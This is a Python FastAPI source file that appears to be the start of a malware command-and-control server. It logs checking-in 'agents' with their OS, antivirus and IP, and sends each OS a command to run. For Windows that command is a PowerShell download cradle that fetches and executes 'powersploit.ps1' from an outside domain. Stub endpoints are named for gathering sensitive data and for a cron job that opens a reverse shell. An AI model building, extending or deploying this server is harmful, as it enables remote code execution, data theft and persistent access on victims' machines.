
import uvicorn
from fastapi import FastAPI, BackgroundTasks 
from pydantic import BaseModel
from datetime import datetime
from datetime import date
from time import sleep, strftime, time

app = FastAPI()


# class below is for handling post request

class CheckIn_Info(BaseModel):
    uid: str
    OS: str = None
    antivirus: str
    ip: str = None

# class for handling gathering params post request
# check in response provides values used in gathering params stage

class GatheringParams(BaseModel):
	OS: str 
	was_check_in: str 
	did_inital_comm_execute: str


class Shell(BaseModel):
	OS: str 
	did_u_gather: str
	port_to_connect: int




## logging background task
def log_event(dict_of_post,message=""):
    with open("log.txt{}".format(strftime("%Y-%m-%d")), mode="a+") as log_file:
    	uid = dict_of_post['uid']
    	log_file.write(message)
    	log_file.write(uid)
    	log_file.write(" ")
    	log_file.write(str(datetime.now())) # date time and check in dictionary.
    	log_file.write("\n")
    	log_file.write(str(dict_of_post))
    	log_file.write("\n*******\n")
    log_file.close()





@app.get("/")
async def read_root():
	return {"Message":"Hello"}



''' 	Agent Check In Function 

		Agent checks in and posts systeminfo to fast api server
		agent information is written to couch DB new collection is created for that agent
		Server responds with script download command OR just general commands to run 

																						'''


@app.post("/check_in")
async def check_in(check_in_result:CheckIn_Info,background_tasks: BackgroundTasks):
	### ADD validation of cookie / header useragent to authenticate
	#
	#
	#
	#

	check_in_dict = check_in_result.dict() # Convert result to dictionary
	## 		Create collection in no sql database based on results aka new entry for agent
	##		
	##		BACKGROUND TASK	Couch DB Functions
	##
	##
				## Print output
	print(''' *** Recieved Connection From Agent: {} IP: {}  ****'''.format(check_in_dict['uid'],check_in_dict['ip']))
	background_tasks.add_task(log_event,check_in_dict, message="Check in from : ")
	#
	##### below code is sending response back to agent with commands to execute based on OS

	if check_in_dict["OS"] == "Windows 10":
		test_command = {"powershell":'''IEX(New-Object Net.WebClient).downloadString("Http://gotyou.com/powersploit.ps1")'''}
		print("PowerShell Command Sent...")
		return test_command

	elif check_in_dict["OS"] == "MACOS":
		send = {"url":"http://127.0.0.1/test.sh"}
		print("Sent bash command")
		return send

	elif check_in_dict['OS'] == "Linux":
		test_command = {"bash":'''curl -s http://127.0.0.1/test.sh''' }
		return test_command

	else:
		return {"Error":"OS Not detected"}
	
	return {"test"} # end of checkin function







@app.post("/gather_sensitive")
async def gathering(gathering:GatheringParams):
	print("test")
	### start gathering information if possible










@app.post("/shell")
async def rev_shell_endpoint(rev_shell:Shell):
	print("test")
	## for last step which is creating task or cronjob to attempt to reverse shell to listener
















if __name__ == "__main__":
    uvicorn.run("main:app", host="127.0.0.1", port=5000, log_level="info")